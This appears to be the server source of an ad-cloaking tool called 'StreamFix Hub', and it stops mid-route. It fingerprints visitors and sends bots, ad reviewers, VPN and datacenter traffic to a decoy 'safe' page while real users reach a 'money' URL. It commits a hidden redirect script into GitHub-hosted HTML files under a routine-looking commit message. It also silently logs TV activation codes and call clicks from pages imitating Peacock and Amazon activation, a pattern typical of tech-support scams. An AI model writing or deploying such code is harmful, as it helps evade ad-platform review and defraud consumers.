const express = require('express');
const path = require('path');
const https = require('https');
const http  = require('http');
const fs = require('fs');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;

// ─── Data file paths ──────────────────────────────────────────────────────────
const SETTINGS_FILE = path.join(__dirname, 'data', 'settings.json');
const LOGS_FILE     = path.join(__dirname, 'data', 'logs.json');
const LEADS_FILE    = path.join(__dirname, 'data', 'leads.json');
const SITES_FILE    = path.join(__dirname, 'data', 'sites.json');
const MAX_LOG_ENTRIES  = 10000;
const MAX_LEAD_ENTRIES = 5000;

const EventEmitter = require('events');
const logEmitter = new EventEmitter();
logEmitter.setMaxListeners(200);

function readSettings() {
  try { return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8')); } catch (e) {
    return { moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [] };
  }
}

function writeSettings(data) {
  fs.writeFileSync(SETTINGS_FILE, JSON.stringify(data, null, 2));
}

function readLogs() {
  try { return JSON.parse(fs.readFileSync(LOGS_FILE, 'utf8')); } catch (e) { return []; }
}

function appendLog(entry) {
  var logs = readLogs();
  logs.unshift(entry);
  if (logs.length > MAX_LOG_ENTRIES) logs = logs.slice(0, MAX_LOG_ENTRIES);
  fs.writeFileSync(LOGS_FILE, JSON.stringify(logs, null, 2));
  logEmitter.emit('newLog', entry);
}

// ─── Leads helpers ────────────────────────────────────────────────────────────
function readLeads() {
  try { return JSON.parse(fs.readFileSync(LEADS_FILE, 'utf8')); } catch (e) { return []; }
}

function appendLead(entry) {
  var leads = readLeads();
  leads.unshift(entry);
  if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
  logEmitter.emit('newLead', entry);
}

function markLeadCalled(ip, code) {
  var leads = readLeads();
  var cutoff = Date.now() - 30 * 60 * 1000;
  var found = false;
  for (var i = 0; i < leads.length; i++) {
    var l = leads[i];
    if (l.type === 'code_submit' && l.ip === ip && new Date(l.ts).getTime() > cutoff) {
      leads[i].called = true;
      leads[i].calledAt = new Date().toISOString();
      found = true;
      break;
    }
  }
  if (!found) {
    leads.unshift({ type: 'call_click', ts: new Date().toISOString(), ip: ip, code: code || '', called: true });
    if (leads.length > MAX_LEAD_ENTRIES) leads = leads.slice(0, MAX_LEAD_ENTRIES);
  }
  fs.writeFileSync(LEADS_FILE, JSON.stringify(leads, null, 2));
}

// ─── Sites helpers ────────────────────────────────────────────────────────────
function readSites() {
  try { return JSON.parse(fs.readFileSync(SITES_FILE, 'utf8')); } catch (e) {
    return [{
      id: 'default', name: 'activatemytvcode.com', domain: 'activatemytvcode.com',
      githubRepo: '', railwayProjectId: '', railwayServiceId: '',
      apiKey: crypto.randomUUID(),
      moneyUrl: '', safeUrl: '/safe', enabled: true, blockedIps: [], allowedCountries: [],
      deployStatus: 'live', isDefault: true
    }];
  }
}

function writeSites(sites) {
  fs.writeFileSync(SITES_FILE, JSON.stringify(sites, null, 2));
}

function getSiteByKey(apiKey) {
  if (!apiKey) return null;
  return readSites().find(function(s) { return s.apiKey === apiKey; }) || null;
}

function getDefaultSite() {
  var sites = readSites();
  return sites.find(function(s) { return s.isDefault; }) || sites[0] || null;
}

function getSiteSettings(apiKey) {
  var site = apiKey ? getSiteByKey(apiKey) : null;
  if (!site) site = getDefaultSite();
  if (!site) return readSettings();
  return {
    moneyUrl:         site.moneyUrl || '',
    safeUrl:          site.safeUrl  || '/safe',
    enabled:          site.enabled !== false,
    blockedIps:       site.blockedIps || [],
    allowedCountries: site.allowedCountries || []
  };
}

// ─── GitHub auto-inject helper ────────────────────────────────────────────────
var CLOAK_SCRIPT_START = '<!-- StreamFix-Hub-Start -->';
var CLOAK_SCRIPT_END   = '<!-- StreamFix-Hub-End -->';

function buildCloakScript(hubUrl, apiKey) {
  return CLOAK_SCRIPT_START + '\n'
    + '<script>\n'
    + '(function(){var _h=\'' + hubUrl + '\',_k=\'' + apiKey + '\';\n'
    + 'try{fetch(_h+\'/api/cloak\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\',\'X-Site-Key\':_k},\n'
    + 'body:JSON.stringify({ua:navigator.userAgent,sw:screen.width,sh:screen.height,\n'
    + 'wd:!!navigator.webdriver,pl:(navigator.plugins||[]).length,\n'
    + 'tz:Intl.DateTimeFormat().resolvedOptions().timeZone})}).then(function(r){return r.json()})\n'
    + '.then(function(d){if(d&&d.url)window.location.replace(d.url)}).catch(function(){})}catch(e){}\n'
    + '})();\n'
    + '</script>\n'
    + CLOAK_SCRIPT_END;
}

function githubApiRequest(method, urlPath, token, body) {
  return new Promise(function(resolve, reject) {
    var payload = body ? JSON.stringify(body) : null;
    var opts = {
      hostname: 'api.github.com',
      path: urlPath,
      method: method,
      headers: {
        'Authorization': 'Bearer ' + token,
        'User-Agent': 'StreamFix-Hub/1.0',
        'Accept': 'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28'
      }
    };
    if (payload) {
      opts.headers['Content-Type'] = 'application/json';
      opts.headers['Content-Length'] = Buffer.byteLength(payload);
    }
    var req = https.request(opts, function(res) {
      var data = '';
      res.on('data', function(c) { data += c; });
      res.on('end', function() {
        try { resolve({ status: res.statusCode, body: JSON.parse(data) }); }
        catch (e) { resolve({ status: res.statusCode, body: data }); }
      });
    });
    req.on('error', reject);
    req.setTimeout(15000, function() { req.destroy(); reject(new Error('GitHub API timeout')); });
    if (payload) req.write(payload);
    req.end();
  });
}

async function githubInject(site, hubUrl) {
  var token = process.env.GITHUB_TOKEN;
  if (!token || !site.githubRepo) {
    return { ok: false, reason: token ? 'no-repo' : 'no-token' };
  }
  var repoPath = site.githubRepo
    .replace(/^https?:\/\/github\.com\//, '')
    .replace(/\.git$/, '')
    .trim();
  if (!repoPath || repoPath.split('/').length < 2) {
    return { ok: false, reason: 'invalid-repo' };
  }

  try {
    var script = buildCloakScript(hubUrl, site.apiKey);

    // Get file tree
    var treeRes = await githubApiRequest('GET', '/repos/' + repoPath + '/git/trees/HEAD?recursive=1', token);
    if (treeRes.status !== 200) return { ok: false, reason: 'repo-not-found', status: treeRes.status };
    var tree = treeRes.body.tree || [];

    // Find HTML files — prioritise index.html, then other .html at root
    var htmlFiles = tree.filter(function(f) {
      return f.type === 'blob' && /\.html$/i.test(f.path) && f.path.indexOf('/') === -1;
    });
    if (!htmlFiles.length) {
      htmlFiles = tree.filter(function(f) { return f.type === 'blob' && /\.html$/i.test(f.path); });
    }
    if (!htmlFiles.length) return { ok: false, reason: 'no-html-files' };

    // Sort: index.html first
    htmlFiles.sort(function(a, b) {
      var ai = /^index\.html$/i.test(a.path) ? 0 : 1;
      var bi = /^index\.html$/i.test(b.path) ? 0 : 1;
      return ai - bi;
    });

    var injected = [];
    for (var i = 0; i < htmlFiles.length; i++) {
      var f = htmlFiles[i];
      var fileRes = await githubApiRequest('GET', '/repos/' + repoPath + '/contents/' + f.path, token);
      if (fileRes.status !== 200) continue;
      var fileData = fileRes.body;
      var originalContent = Buffer.from(fileData.content || '', 'base64').toString('utf8');

      // Remove existing injection if present
      var re = new RegExp(CLOAK_SCRIPT_START.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&') + '[\\s\\S]*?' + CLOAK_SCRIPT_END.replace(/[-[\]{}()*+?.,\\^$|#\s]/g, '\\$&'), 'g');
      var stripped = originalContent.replace(re, '');

      // Inject after <head> or at start of <body>
      var newContent;
      if (/<head[^>]*>/i.test(stripped)) {
        newContent = stripped.replace(/(<head[^>]*>)/i, '$1\n' + script + '\n');
      } else if (/<body[^>]*>/i.test(stripped)) {
        newContent = stripped.replace(/(<body[^>]*>)/i, '$1\n' + script + '\n');
      } else {
        newContent = script + '\n' + stripped;
      }

      var putRes = await githubApiRequest('PUT', '/repos/' + repoPath + '/contents/' + f.path, token, {
        message: 'chore: update StreamFix cloaking script [auto]',
        content: Buffer.from(newContent).toString('base64'),
        sha: fileData.sha
      });
      if (putRes.status === 200 || putRes.status === 201) {
        injected.push(f.path);
      }
    }

    if (!injected.length) return { ok: false, reason: 'inject-failed' };

    // Update site deploy status
    var sites = readSites();
    for (var j = 0; j < sites.length; j++) {
      if (sites[j].id === site.id) {
        sites[j].deployStatus = 'pushed';
        sites[j].lastPushed = new Date().toISOString();
        sites[j].injectedFiles = injected;
        break;
      }
    }
    writeSites(sites);
    return { ok: true, injected: injected };
  } catch (e) {
    return { ok: false, reason: 'error', message: e.message };
  }
}

async function getRailwayStatus(site) {
  var token = process.env.RAILWAY_API_TOKEN;
  if (!token || !site.railwayProjectId || !site.railwayServiceId) return null;
  try {
    var query = JSON.stringify({
      query: 'query { deployments(input: { projectId: "' + site.railwayProjectId + '", serviceId: "' + site.railwayServiceId + '" }) { edges { node { status createdAt } } } }'
    });
    return new Promise(function(resolve) {
      var opts = {
        hostname: 'backboard.railway.app',
        path: '/graphql/v2',
        method: 'POST',
        headers: {
          'Authorization': 'Bearer ' + token,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(query)
        }
      };
      var req = https.request(opts, function(res) {
        var data = '';
        res.on('data', function(c) { data += c; });
        res.on('end', function() {
          try {
            var p = JSON.parse(data);
            var edges = p.data && p.data.deployments && p.data.deployments.edges;
            if (edges && edges.length > 0) {
              resolve(edges[0].node.status.toLowerCase());
            } else {
              resolve(null);
            }
          } catch (e) { resolve(null); }
        });
      });
      req.on('error', function() { resolve(null); });
      req.setTimeout(8000, function() { req.destroy(); resolve(null); });
      req.write(query);
      req.end();
    });
  } catch (e) { return null; }
}

// ─── Admin password ───────────────────────────────────────────────────────────
var ADMIN_PASSWORD_HASH;
(function() {
  var pwd = process.env.ADMIN_PASSWORD;
  if (!pwd) {
    var crypto = require('crypto');
    pwd = crypto.randomBytes(9).toString('base64'); // 12-char base64
    console.warn('');
    console.warn('⚠️  WARNING: ADMIN_PASSWORD env var is not set.');
    console.warn('   One-time admin password for this session: ' + pwd);
    console.warn('   Set ADMIN_PASSWORD in your environment to make it permanent.');
    console.warn('');
  }
  ADMIN_PASSWORD_HASH = bcrypt.hashSync(pwd, 10);
})();

// ─── Per-IP frequency store (in-memory, 24-hour window) ──────────────────────
// Map<ip, lastVisitTimestamp>
var ipFreqStore = new Map();
var IP_FREQ_MAX = 10000;
var IP_FREQ_WINDOW_MS = 24 * 60 * 60 * 1000; // 24 hours

function checkFrequency(ip) {
  var now = Date.now();
  var last = ipFreqStore.get(ip);
  if (last && (now - last) < IP_FREQ_WINDOW_MS) {
    // Seen within 24h — it's a repeat click
    ipFreqStore.set(ip, now);
    return true;
  }
  // First visit (or >24h ago) — record and allow
  // Evict oldest entry if store is full
  if (!last && ipFreqStore.size >= IP_FREQ_MAX) {
    var firstKey = ipFreqStore.keys().next().value;
    ipFreqStore.delete(firstKey);
  }
  ipFreqStore.set(ip, now);
  return false;
}

function clearFrequencyStore() {
  ipFreqStore.clear();
}

// ─── Bot / crawler UA blocklist ───────────────────────────────────────────────
var BOT_PATTERNS = [
  /googlebot/i, /adsbot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
  /baiduspider/i, /yandexbot/i, /sogou/i, /exabot/i, /facebot/i,
  /ia_archiver/i, /mj12bot/i, /dotbot/i, /semrushbot/i, /ahrefsbot/i,
  /majestic/i, /rogerbot/i, /screaming.frog/i, /wget/i, /curl/i,
  /python-requests/i, /libwww-perl/i, /java\//i, /go-http-client/i,
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i, /whatsapp/i,
  /pinterest/i, /slackbot/i, /telegrambot/i, /headlesschrome/i,
  /phantomjs/i, /selenium/i, /webdriver/i, /scrapy/i,
  /crawler/i, /spider/i, /bot\b/i
];

function isBot(ua) {
  if (!ua) return true;
  return BOT_PATTERNS.some(function(p) { return p.test(ua); });
}

// ─── Suspicious ISP/org keywords ─────────────────────────────────────────────
var SUSPICIOUS_ISP = [
  'google', 'amazon', 'microsoft', 'cloudflare', 'digitalocean',
  'linode', 'vultr', 'ovh', 'hetzner', 'facebook', 'apple'
];

function isSuspiciousISP(isp, org) {
  var combined = ((isp || '') + ' ' + (org || '')).toLowerCase();
  return SUSPICIOUS_ISP.some(function(k) { return combined.indexOf(k) !== -1; });
}

// ─── IP reputation check via ip-api.com ──────────────────────────────────────
function checkIP(ip) {
  return new Promise(function(resolve) {
    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('10.') ||
        ip.startsWith('192.168.') || ip.startsWith('172.')) {
      return resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: 'local', org: '' });
    }
    var opts = {
      hostname: 'ip-api.com',
      path: '/json/' + ip + '?fields=status,country,countryCode,city,regionName,isp,org,proxy,hosting',
      method: 'GET',
      headers: { 'User-Agent': 'node-cloaker/1.0' }
    };
    var req = http.request(opts, function(res) {
      var data = '';
      res.on('data', function(c) { data += c; });
      res.on('end', function() {
        try {
          var p = JSON.parse(data);
          resolve({
            proxy: p.proxy || false,
            hosting: p.hosting || false,
            country: p.countryCode || 'XX',
            city: p.city || '',
            regionName: p.regionName || '',
            isp: p.isp || '',
            org: p.org || ''
          });
        } catch (e) { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); }
      });
    });
    req.on('error', function() { resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
    req.setTimeout(4000, function() { req.destroy(); resolve({ proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' }); });
    req.end();
  });
}

// ─── Middleware ───────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
  secret: process.env.SESSION_SECRET || 'fallback-secret-change-me',
  resave: false,
  saveUninitialized: false,
  cookie: { httpOnly: true, maxAge: 8 * 60 * 60 * 1000 }
}));

function requireAdmin(req, res, next) {
  if (req.session && req.session.adminAuth) return next();
  res.redirect('/admin/login');
}

// ─── Public routes ────────────────────────────────────────────────────────────
app.get('/', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/peacock', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'peacock.html'));
});

app.get('/safe', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'safe.html'));
});

app.get('/offer', function(req, res) {
  res.sendFile(path.join(__dirname, 'public', 'offer.html'));
});

// ─── Self-hosted cloaking engine ──────────────────────────────────────────────
app.post('/api/cloak', async function(req, res) {
  var siteKey  = req.headers['x-site-key'] || req.body.siteKey || '';
  var site     = siteKey ? getSiteByKey(siteKey) : null;
  var settings = site ? {
    moneyUrl: site.moneyUrl, safeUrl: site.safeUrl, enabled: site.enabled !== false,
    blockedIps: site.blockedIps || [], allowedCountries: site.allowedCountries || []
  } : readSettings();
  var siteId   = site ? site.id : 'default';

  var realIP = req.headers['x-forwarded-for']
    ? req.headers['x-forwarded-for'].split(',')[0].trim()
    : req.connection.remoteAddress;

  var ua = req.headers['user-agent'] || req.body.ua || '';
  var tz = req.body.tz || '';
  var sw = parseInt(req.body.sw) || 0;
  var sh = parseInt(req.body.sh) || 0;
  var wd = req.body.wd === true || req.body.wd === 'true';
  var pl = parseInt(req.body.pl) || 0;
  var screenStr = sw + 'x' + sh;

  var moneyUrl = settings.moneyUrl || '/offer';
  var safeUrl  = settings.safeUrl  || '/safe';

  function fastBlock(reason) {
    var entry = {
      ts: new Date().toISOString(), ip: realIP, siteId: siteId,
      country: 'XX', city: '', region: '', isp: '',
      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
      decision: 'block', reason: reason
    };
    appendLog(entry);
    return res.json({ decision: 'block', url: safeUrl });
  }

  // Cloaking disabled → always allow
  if (!settings.enabled) {
    appendLog({
      ts: new Date().toISOString(), ip: realIP, siteId: siteId,
      country: 'XX', city: '', region: '', isp: '',
      ua: ua.slice(0, 80), screen: screenStr, plugins: pl,
      decision: 'allow', reason: 'disabled'
    });
    return res.json({ decision: 'allow', url: moneyUrl });
  }

  // 1. Manual IP blocklist — checked first so it always wins with reason manual-block
  var blockedIps = Array.isArray(settings.blockedIps) ? settings.blockedIps : [];
  if (blockedIps.indexOf(realIP) !== -1) return fastBlock('manual-block');

  // 2. Repeat-click frequency check — only for IPs not on the manual list
  if (checkFrequency(realIP)) return fastBlock('repeat-click');

  // 3. Bot User-Agent check
  if (isBot(ua)) return fastBlock('bot-ua');

  // 4. Webdriver flag
  if (wd) return fastBlock('webdriver');

  // 5. Screen size checks
  if (sw === 0 || sh === 0) return fastBlock('no-screen');
  if ((sw === 800 && sh === 600) || (sw === 1024 && sh === 768)) {
    if (pl === 0) return fastBlock('headless-screen');
  }

  // 6. Plugin count + desktop UA check
  var isMobile = /iPhone|Android|iPad|Mobile/i.test(ua);
  var isDesktop = /Windows|Macintosh/i.test(ua);
  if (!isMobile && isDesktop && pl === 0) return fastBlock('no-plugins-desktop');

  // 7. IP reputation check (includes city/region/ISP/country)
  var ipData;
  try { ipData = await checkIP(realIP); } catch (e) {
    ipData = { proxy: false, hosting: false, country: 'XX', city: '', regionName: '', isp: '', org: '' };
  }

  var decision = 'allow';
  var reason   = 'clean';

  // 8. Country/geo filter (after IP lookup, before other network checks)
  var allowedCountries = Array.isArray(settings.allowedCountries) ? settings.allowedCountries : [];
  if (allowedCountries.length > 0) {
    var visitorCC = (ipData.country || 'XX').toUpperCase();
    var allowed = allowedCountries.some(function(cc) { return cc.toUpperCase() === visitorCC; });
    if (!allowed) {
      decision = 'block';
      reason   = 'country-block';
    }
  }

  // 9. Suspicious ISP/org check
  if (decision === 'allow' && isSuspiciousISP(ipData.isp, ipData.org)) {
    decision = 'block';
    reason   = 'suspicious-isp';
  }

  // 10. Proxy / hosting check
  if (decision === 'allow' && (ipData.proxy || ipData.hosting)) {
    decision = 'block';
    reason   = ipData.proxy ? 'proxy-vpn' : 'datacenter';
  }

  appendLog({
    ts: new Date().toISOString(),
    ip: realIP,
    siteId: siteId,
    country: ipData.country || 'XX',
    city: ipData.city || '',
    region: ipData.regionName || '',
    isp: ipData.isp || '',
    ua: ua.slice(0, 80),
    screen: screenStr,
    plugins: pl,
    decision: decision,
    reason: reason
  });

  res.json({ decision: decision, url: decision === 'allow' ? moneyUrl : safeUrl });
});

// ─── Legacy redirect ───────────────────────────────────────────────────────────
app.post('/api/cloakify', function(req, res) {
  res.redirect(307, '/api/cloak');
});

// ─── Lead capture (public — fires silently from amazon-activate page) ─────────
app.post('/api/track/lead', async function(req, res) {
  res.json({ ok: true }); // respond immediately, never block the client
  try {
    var siteKey = req.headers['x-site-key'] || req.body.siteKey || '';
    var site    = siteKey ? getSiteByKey(siteKey) : null;
    var siteId  = site ? site.id : 'default';

    var type   = req.body.type || 'code_submit';
    var realIP = req.headers['x-forwarded-for']
      ? req.headers['x-forwarded-for'].split(',')[0].trim()
      : req.connection.remoteAddress;
    var code = (req.body.code || '').slice(0, 20).toUpperCase();

    if (type === 'call_click') {
      markLeadCalled(realIP, code);
      return;
    }

    var ua = req.headers['user-agent'] || req.body.ua || '';
    var ipData;
    try { ipData = await checkIP(realIP); } catch (e) {
      ipData = { country: 'XX', city: '', regionName: '', isp: '' };
    }

    appendLead({
      type:         'code_submit',
      ts:           new Date().toISOString(),
      ip:           realIP,
      siteId:       siteId,
      country:      ipData.country      || 'XX',
      city:         ipData.city         || '',
      region:       ipData.regionName   || '',
      isp:          ipData.isp          || '',
      ua:           ua.slice(0, 120),
      code:         code,
      screen:       (parseInt(req.body.sw) || 0) + 'x' + (parseInt(req.body.sh) || 0),
      tz:           (req.body.tz         || '').slice(0, 50),
      referrer:     (req.body.referrer   || '').slice(0, 200),
      utm_source:   (req.body.utm_source   || '').slice(0, 80),
      utm_campaign: (req.body.utm_campaign || '').slice(0, 80),
      utm_term:     (req.body.utm_term     || '').slice(0, 80),
      utm_content:  (req.body.utm_content  || '').slice(0, 80),
      gclid:        (req.body.gclid        || '').slice(0, 80),
      called:       false
    });
  } catch (e) { /* silently swallow — never break client experience */ }
});

// ─── Admin login ──────────────────────────────────────────────────────────────
app.get('/admin/login', function(req, res) {
  if (req.session && req.session.adminAuth) return res.redirect('/admin');
  var error = req.query.error ? '<p class="error">Invalid credentials. Try again.</p>' : '';
  res.send(adminLoginPage(error));
});

app.post('/admin/login', function(req, res) {
  var password = req.body.password || '';
  if (bcrypt.compareSync(password, ADMIN_PASSWORD_HASH)) {
    req.session.adminAuth = true;
    return res.redirect('/admin');
  }
  res.redirect('/admin/login?error=1');
});

// ─── Admin logout ─────────────────────────────────────────────────────────────
app.get('/admin/logout', function(req, res) {
  req.session.destroy(function() { res.redirect('/admin/login'); });
});

// ─── Admin dashboard ──────────────────────────────────────────────────────────
var LOG_PAGE_SIZE  = 100;
var LEAD_PAGE_SIZE = 50;

app.get('/admin', requireAdmin, function(req, res) {
  var settings   = readSettings();
  var sites      = readSites();
  var siteFilter = req.query.site || '';
  var siteCreated = req.query.siteCreated === '1';

  // Find selected site object (null = All Sites)
  var selectedSite = siteFilter ? sites.find(function(s) { return s.id === siteFilter; }) : null;

  // Merge default site settings into settings for backwards compat display
  if (selectedSite) {
    settings = {
      moneyUrl: selectedSite.moneyUrl, safeUrl: selectedSite.safeUrl,
      enabled: selectedSite.enabled !== false,
      blockedIps: selectedSite.blockedIps || [],
      allowedCountries: selectedSite.allowedCountries || []
    };
  }

  var allLogs   = readLogs();
  var allLeads  = readLeads();

  // Filter by site if selected
  if (siteFilter) {
    allLogs  = allLogs.filter(function(l) {
      var lid = l.siteId || 'default';
      return lid === siteFilter;
    });
    allLeads = allLeads.filter(function(l) {
      var lid = l.siteId || 'default';
      return lid === siteFilter;
    });
  }

  var allSubmits = allLeads.filter(function(l) { return l.type === 'code_submit'; });

  var logTotal  = allLogs.length;
  var leadTotal = allSubmits.length;

  var logMaxPage  = Math.max(1, Math.ceil(logTotal  / LOG_PAGE_SIZE));
  var leadMaxPage = Math.max(1, Math.ceil(leadTotal / LEAD_PAGE_SIZE));

  var logPage  = Math.min(logMaxPage,  Math.max(1, parseInt(req.query.logPage)  || 1));
  var leadPage = Math.min(leadMaxPage, Math.max(1, parseInt(req.query.leadPage) || 1));

  var logStart  = (logPage - 1)  * LOG_PAGE_SIZE;
  var leadStart = (leadPage - 1) * LEAD_PAGE_SIZE;

  var logs  = allLogs.slice(logStart, logStart + LOG_PAGE_SIZE);
  var leads = allSubmits.slice(leadStart, leadStart + LEAD_PAGE_SIZE);

  var activeIpTimes = (function() {
    var cutoff = Date.now() - 3 * 60 * 1000;
    var seen = {};
    allLogs.forEach(function(l) {
      if (l.ip && l.ts) {
        var t = new Date(l.ts).getTime();
        if (t > cutoff) seen[l.ip] = Math.max(seen[l.ip] || 0, t);
      }
    });
    return seen;
  })();
  var activeCount = Object.keys(activeIpTimes).length;
  var recentEvents = allLogs.slice(0, 8);

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');

  res.send(adminDashboardPage(settings, logs, leads, {
    logPage: logPage, logTotal: logTotal,
    leadPage: leadPage, leadTotal: leadTotal,
    activeCount: activeCount, recentEvents: recentEvents,
    activeIpTimes: activeIpTimes,
    allLogs: allLogs, allLeads: allLeads,
    sites: sites, siteFilter: siteFilter,
    selectedSite: selectedSite,
    hubUrl: hubUrl,
    siteCreated: siteCreated,
    hasGithubToken: !!process.env.GITHUB_TOKEN,
    hasRailwayToken: !!process.env.RAILWAY_API_TOKEN
  }));
});

// ─── Admin SSE events ─────────────────────────────────────────────────────────
app.get('/admin/events', requireAdmin, function(req, res) {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  function onLog(entry) {
    res.write('data: ' + JSON.stringify({ type: 'log', entry: entry }) + '\n\n');
  }
  function onLead(entry) {
    res.write('data: ' + JSON.stringify({ type: 'lead', entry: entry }) + '\n\n');
  }

  logEmitter.on('newLog', onLog);
  logEmitter.on('newLead', onLead);

  var keepAlive = setInterval(function() {
    res.write(': ping\n\n');
  }, 25000);

  req.on('close', function() {
    logEmitter.removeListener('newLog', onLog);
    logEmitter.removeListener('newLead', onLead);
    clearInterval(keepAlive);
  });
});

// ─── Admin settings save (URLs) ───────────────────────────────────────────────
app.post('/admin/settings', requireAdmin, function(req, res) {
  var settings = readSettings();
  settings.moneyUrl = (req.body.moneyUrl || '').trim();
  settings.safeUrl  = (req.body.safeUrl  || '/safe').trim();
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin toggle cloaking ────────────────────────────────────────────────────
app.post('/admin/toggle', requireAdmin, function(req, res) {
  var settings = readSettings();
  settings.enabled = !settings.enabled;
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin clear logs ─────────────────────────────────────────────────────────
app.post('/admin/clear-logs', requireAdmin, function(req, res) {
  fs.writeFileSync(LOGS_FILE, '[]');
  res.redirect('/admin');
});

// ─── Admin clear leads ────────────────────────────────────────────────────────
app.post('/admin/clear-leads', requireAdmin, function(req, res) {
  fs.writeFileSync(LEADS_FILE, '[]');
  res.redirect('/admin');
});

// ─── Admin save blocked IPs ───────────────────────────────────────────────────
app.post('/admin/blocked-ips', requireAdmin, function(req, res) {
  var settings = readSettings();
  var raw = (req.body.blockedIps || '').trim();
  settings.blockedIps = raw
    .split(/[\n,]+/)
    .map(function(s) { return s.trim(); })
    .filter(function(s) { return s.length > 0; });
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin save allowed countries ────────────────────────────────────────────
app.post('/admin/allowed-countries', requireAdmin, function(req, res) {
  var settings = readSettings();
  var raw = (req.body.allowedCountries || '').trim();
  settings.allowedCountries = raw
    .split(/[\n,\s]+/)
    .map(function(s) { return s.trim().toUpperCase(); })
    .filter(function(s) { return s.length === 2; });
  writeSettings(settings);
  res.redirect('/admin');
});

// ─── Admin export blocked IPs for Google Ads ──────────────────────────────────
app.get('/admin/blocked-ips-export', requireAdmin, function(req, res) {
  var settings  = readSettings();
  var logs      = readLogs();
  var seen      = {};
  var unique    = [];
  var privateRe = /^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|::1$|fd)/;

  function add(ip) {
    if (ip && !seen[ip] && !privateRe.test(ip)) { seen[ip] = true; unique.push(ip); }
  }

  (settings.blockedIps || []).forEach(add);
  logs.filter(function(l) { return l.decision === 'block'; }).forEach(function(l) { add(l.ip); });

  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Content-Disposition', 'attachment; filename="blocked-ips.txt"');
  res.send(unique.join('\n'));
});

app.post('/admin/clear-frequency', requireAdmin, function(req, res) {
  clearFrequencyStore();
  res.redirect('/admin');
});

// ─── Admin sites management ───────────────────────────────────────────────────
app.post('/admin/sites', requireAdmin, async function(req, res) {
  var name      = (req.body.name || '').trim();
  var domain    = (req.body.domain || '').trim().replace(/^https?:\/\//, '').replace(/\/$/, '');
  var githubRepo = (req.body.githubRepo || '').trim();
  var moneyUrl  = (req.body.moneyUrl || '').trim();
  if (!name) return res.redirect('/admin?siteErr=name');

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
  var id = 'site-' + Date.now();
  var apiKey = crypto.randomUUID();
  var safeUrl = hubUrl + '/sites/' + id + '/safe';

  var newSite = {
    id: id, name: name, domain: domain, githubRepo: githubRepo,
    railwayProjectId: '', railwayServiceId: '',
    apiKey: apiKey, moneyUrl: moneyUrl, safeUrl: safeUrl,
    enabled: true, blockedIps: [], allowedCountries: [],
    deployStatus: 'pending', isDefault: false,
    createdAt: new Date().toISOString()
  };

  var sites = readSites();
  sites.push(newSite);
  writeSites(sites);

  // Fire GitHub inject in background — don't block redirect
  if (githubRepo && process.env.GITHUB_TOKEN) {
    githubInject(newSite, hubUrl).then(function(r) {
      if (r.ok) {
        var ss = readSites();
        for (var i = 0; i < ss.length; i++) {
          if (ss[i].id === id) { ss[i].deployStatus = 'pushed'; break; }
        }
        writeSites(ss);
      }
    }).catch(function() {});
  }

  res.redirect('/admin?site=' + id + '&siteCreated=1');
});

app.post('/admin/sites/:id/settings', requireAdmin, async function(req, res) {
  var id = req.params.id;
  var sites = readSites();
  var idx = sites.findIndex(function(s) { return s.id === id; });
  if (idx === -1) return res.redirect('/admin');

  var hubUrl = 'https://' + (process.env.REPLIT_DEV_DOMAIN || req.headers.host || 'localhost');
  var site = sites[idx];
  site.name             = (req.body.name       || site.name).trim();
  site.domain           = (req.body.domain     || '').trim().replace(/^https?:\/\//, '').replace(/\/$/, '') || site.domain;
  site.githubRepo       = (req.body.githubRepo !== undefined) ? req.body.githubRepo.trim() : site.githubRepo;
  site.railwayProjectId = (req.body.railwayProjectId !== undefined) ? req.body.railwayProjectId.trim() : site.railwayProjectId;
  site.railwayServiceId = (req.body.railwayServiceId !== undefined) ? req.body.railwayServiceId.trim() : site.railwayServiceId;
  site.moneyUrl         = (req.body.moneyUrl !== undefined) ? req.body.moneyUrl.trim() : site.moneyUrl;
  site.safeUrl          = (req.body.safeUrl  !== undefined && req.body.safeUrl.trim()) ? req.body.safeUrl.trim() : site.safeUrl;
  site.enabled          = req.body.enabled !== 'false';

  var raw = req.body.blockedIps || '';
  if (typeof raw === 'string') {
    site.blockedIps = raw.split(/[\n,]+/).map(function(s) { return s.trim(); }).filter(Boolean);
  }
  var rawCC = req.body.allowedCountries || '';
  if (typeof rawCC === 'string') {
    site.allowedCountries = rawCC.split(/[\n,\s]+/).map(function(s) { return s.trim().toUpperCase(); }).filter(function(s) { return s.length === 2; });
  }
  sites[idx] = site;
  writeSites(sites);

